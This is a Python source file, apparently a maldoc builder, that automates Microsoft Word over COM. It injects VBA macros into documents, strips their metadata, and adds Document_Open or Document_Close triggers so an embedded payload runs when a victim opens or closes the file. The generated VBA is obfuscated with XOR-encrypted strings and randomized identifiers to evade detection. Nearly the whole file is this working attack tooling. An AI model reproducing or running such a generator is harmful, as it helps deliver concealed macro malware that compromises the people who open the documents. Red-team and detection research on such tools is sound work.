from ctypes import *
from const import *
import win32com.client, os, pythoncom, string, random, re
from _winreg import *

def random_value(size, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for _ in range(size));


class WordObject:
    def __init__( self ):
        pythoncom.CoInitializeEx(pythoncom.COINIT_APARTMENTTHREADED)
        try:
            self.word = win32com.client.Dispatch( "Word.Application" )
        except:
            Info("Cannot launch win32com.client.Dispatch(\"Word.Application\"), check if word and pywin32 module are correcty installed", 3)

        self.word.Visible = 0

    def Open(self, sFilename):
        try:
            self.doc = self.word.Documents.Open(sFilename, False, False, False)
        except:
            self.Close()
            self.Quit()
            Info("Cannot open "+sFilename+", Please check the validity of the path or the filename", 3)


    def CreateNew(self):
        self.doc = self.word.Documents.Add( ) # create new doc

    def Save(self, sFilename=None, filetype=None):
        if sFilename:
            try:
                self.doc.SaveAs(sFilename+filetype)
            except:
                Info("Cannot save the file to " +sFilename+filetype+" Please check the validity of the path or the filename.", 3)
                self.Close()
                self.Quit()
        else:
            self.doc.Save()

    def AddVba(self, vba, module_name=None):
        if module_name:
            try:
                self.vba_module = self.doc.VBproject.VBComponents.Add(1)
                self.vba_module.Name = module_name
                self.vba_module.CodeModule.AddFromString(vba)
            except:
                self.Close()
                self.Quit()
                Info("Can't create vba module " +module_name+", check if your template file is not modifiy or if you module name is ok, or if VBA Project object model is activated on macro options", 3)
        else:
            self.vba_active = self.doc.VBproject.VBComponents("ThisDocument").CodeModule
            self.vba_active.AddFromString(vba)

    def DeleteVbaModule(self, name):
        try:
            vba_module_todel = self.doc.VBproject.VBComponents(name)
            self.doc.VBproject.VBComponents.Remove(vba_module_todel)
        except:
            self.Close()
            self.Quit()
            Info("Can't delete vba module " +name+", check if the module was succefully created before", 3)

    def RunMacro(self, macro_name):
        try:
            self.word.Run(macro_name)
        except:
            self.Close()
            self.Quit()
            Info("Can't run macro " +macro_name+", check if the macro_name is ok, if the macro exists or if macro are activated in Word/excel", 3)

    def Change_Macro_Settings(self):
        self.word.AutomationSecurity = 3

    def Remove_Metadata(self):
        self.doc.RemoveDocumentInformation(99)
        self.doc.CustomDocumentProperties.Add("Info", False, 4, "8535297daa9f55f6c7e7e59af82908bb47eedc7d8a877b559211a0e25e71168e")

    def generate_trigger_function(self, vba_object, method):

        if method == "onClose":
            gen_fun = """Private Sub Document_Close()
            If ActiveDocument.Variables("%(trigger_close_test_name)s").Value = "%(trigger_close_test_value)s" Then
            ActiveDocument.Variables("%(trigger_close_test_name)s").Value = "NOP"
            ActiveDocument.Save
            Else
            """%{
            "trigger_close_test_name" : trigger_close_test_name,
            "trigger_close_test_value" : trigger_close_test_value
            }
        if method == "onOpen":
            gen_fun = "Private Sub Document_Open()\n"

        gen_fun += """If ActiveDocument.Variables("%(key_name)s").Value <> "toto" Then
        %(trigger_fun_name)s
        ActiveDocument.Variables("%(key_name)s").Value = "toto"
        If ActiveDocument.ReadOnly=False Then
        ActiveDocument.Save
        End If
        End If
        """%{
        "trigger_fun_name" : vba_object.rand_trigger_function_name,
        "key_name" : vba_object.key_name,
        }

        if method == "onClose": gen_fun += "\n End If\n"
        gen_fun += "End Sub\n"
        gen_vba = vba_object.getCurrentVba() +"\n"+ gen_fun
        return gen_vba

    def Close(self):
        self.doc.Close(SaveChanges=0)

    def Quit(self):
        self.word.Quit()
        #os.system("taskkill /im WINWORD.exe")
        pythoncom.CoUninitialize()


class Enc_VBA_XOR:
    def __init__(self, vba_str, trigger_function_name):
        self.key = random_value(encryption_key_length)
        self.xor_function_name = random_value(10, string.ascii_letters)
        self.key_name = random_value(5, string.ascii_letters)
        self.trigger_function_name = trigger_function_name
        self.vba = vba_str
        self.genereate_xor_function()
        self.n = 0

    def genereate_xor_function(self):
        self.xor_function = """Private Function %(fun_name)s (%(text)s as Variant, %(begin)s as Integer )
        Dim %(temp)s, %(key_v)s As String, %(i)s, %(a)s
        %(key_v)s = ActiveDocument.Variables("%(key_name)s").Value()
        %(temp)s = ""
        %(i)s = 1
        While %(i)s < UBound(%(text)s) + 2
        %(a)s = %(i)s Mod Len(%(key_v)s): If %(a)s = 0 Then %(a)s = Len(%(key_v)s)
        %(temp)s = %(temp)s + chr(Asc(Mid(%(key_v)s,%(a)s+%(begin)s,1)) Xor CInt(%(text)s(%(i)s - 1)))
        %(i)s = %(i)s+1
        wend
        %(fun_name)s = %(temp)s
        End Function
        """%{
        "fun_name": self.xor_function_name,
        "key_name": self.key_name,
        "text":random_value(10, string.ascii_letters),
        "begin":random_value(10, string.ascii_letters),
        "temp":random_value(10, string.ascii_letters),
        "key_v":random_value(10, string.ascii_letters),
        "i":random_value(10, string.ascii_letters),
        "a":random_value(10, string.ascii_letters),
        "temp":random_value(10, string.ascii_letters),
        }

    def randomize_var(self): # could be used in other objects
        var_names =  list(set(re.findall(regex_rand_var, self.vba))) #Get all variable name to Change
        self.vba = re.sub(regex_rand_del, '', self.vba) #Delete markers
        for var_len, var in var_names:
            temp = random_value(int(var_len), string.ascii_letters)
            self.vba = re.sub(r"\b"+var+r"\b", temp, self.vba) #Randomize variable names
            if var == self.trigger_function_name:
                self.rand_trigger_function_name = temp

        if hasattr(self,"rand_trigger_function_name"):
            Info("Randomized trigger function name : "+self.rand_trigger_function_name, 0, 3)
        else:
            raise Info(" The trigger function name "+self.trigger_function_name+" has not been found in the vba, triggering point cannot be set" , 3)

    def obfuscate_string(self):
        vba_strings = list(set(re.findall(regex_defaut_string, self.vba)))
        for strings in vba_strings:
            ciphered_string = ""
            if exclude_mark not in strings:
				for i in range(len(strings)):
					ciphered_string += str((ord(strings[i]) ^ ord(self.key[self.n+i])))+","
					if i % 20 == 0 and i != 0 and i != len(strings) - 1:
						ciphered_string += " _ \n"
				ciphered_string = ciphered_string[:-1]
				self.vba = self.vba.replace("\""+strings+"\"", self.xor_function_name + " ( Array ( "+ciphered_string+" ), "+str(self.n)+" )") #replace only VBA Strings, avoid replacing code in function for example.
				self.n += len(strings)
        self.vba = re.sub(regex_exclude_string_del, '', self.vba)
        self.vba = self.xor_function + self.vba

    def hide_string(self):
        hide_string = list(set(re.findall(regex_string_to_hide, self.vba)))
        for var_name in hide_string:
            ciphered_string = ""
            if var_name in string_to_hide:
                strings = string_to_hide[var_name]
                for i in range(len(strings)):
                    ciphered_string += str((ord(strings[i]) ^ ord(self.key[self.n+i])))+","
                    if i % 20 == 0 and i != 0 and i != len(strings) - 1:
                        ciphered_string += " _ \n"
                ciphered_string = ciphered_string[:-1]
                self.vba = re.sub(regex_string_to_hide_find.replace(variable_name_ex, var_name), self.xor_function_name + " ( Array ( "+ciphered_string+" ), "+str(self.n)+" )", self.vba) #replace only VBA Strings, avoid replacing code in function for example.
                self.n += len(strings)
            else:
                self.vba = re.sub(regex_string_to_hide_find.replace(variable_name_ex, var_name), '\"\"', self.vba) #replace only VBA Strings, avoid replacing code in function for example.
                Info("Variable "+var_name+" not in dic string_to_hide, marker has been replaced by empty string", 2, 3)

    def getCurrentVba(self):
        return self.vba

class VBA_Functions:

    def generate_generic_store_function(self, macro_name, variable_name, variable_value):
        set_var = self.format_long_string(variable_value, "tmp")

        gen_vba = """
        Sub %(macro_name)s()
        %(set_var)s
        ActiveDocument.Variables.Add Name:="%(variable_name)s", Value:=%(variable_value)s
        End Sub
        """%{
        "set_var" : set_var,
        "macro_name" : macro_name,
        "variable_name" : variable_name,
        "variable_value": "tmp"
        }
        return gen_vba

    def format_long_string(self, long_string, str_name):
        tmp = "Dim "+str_name+" as String\r\n"
        tmp += str_name + " = \"\"\r\n"
        tmp += str_name +"="+str_name+ " & \""

        for i in range(len(long_string)):
            tmp += long_string[i]
            if i % 100 == 0 and i != 0 and i != len(long_string) - 1:
                tmp += "\" \n"
                tmp += str_name +" = "+str_name+" & \""
        if i % 100 != 0:
                tmp += "\" \n"
        return tmp

class Info(Exception):
    def __init__(self, raison, level, tab=1):
        self.STD_OUTPUT_HANDLE_ID = c_ulong(0xfffffff5)
        self.std_output_hdl = windll.Kernel32.GetStdHandle(self.STD_OUTPUT_HANDLE_ID)
        windll.Kernel32.GetStdHandle.restype = c_ulong
        if level == 3:
            windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 12)
            print "[x] " + raison
            windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 7)
            exit()
        elif level == 2:
            if error_level == 2 or 3:
                windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 14)
                err = ""
                for i in range(tab):
                    err += "\t"
                print err + "[!] " + raison
                windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 7)
        elif level == 1:
                windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 10)
                err = ""
                for i in range(tab):
                    err += "\t"
                print err + "[*] " + raison
                windll.Kernel32.SetConsoleTextAttribute(self.std_output_hdl, 7)
        elif level == 0:
            if error_level == 3:
                err = ""
                for i in range(tab):
                    err += "\t"
                print err +"[+] "+ raison
